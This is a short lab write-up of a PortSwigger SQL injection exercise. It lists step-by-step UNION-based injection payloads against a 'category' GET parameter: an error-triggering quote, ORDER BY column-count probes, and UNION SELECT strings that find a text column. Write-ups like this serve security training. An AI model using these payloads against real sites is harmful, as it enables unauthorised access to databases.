**Lab:** SQL injection UNION attack, finding a column containing text

**Vulnerability:** basic sql union queries

**Vulnerable Parameter:** category (GET request)

**Technique:** UNION attack with basic queries

**URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
## Steps:
1. Find category parameter
2. Open Burp Suite and send request to Repeater
3. Test with `'` → Internal Server Error
4. Comment out with `--` → worked
5. Find column count: `' ORDER BY 2--` works, `' ORDER BY 3--` works, ORDER BY 4 fails (3 columns)
6. ' UNION SELECT NULL, NULL, NULL--
7. ' UNION SELECT 'text', NULL, NULL-- → Error
8. ' UNION SELECT NULL, 'text', NULL-- → worked (found column accepts string)
9. ' UNION SELECT NULL, 'MVSmqA', NULL--
10. Lab solved
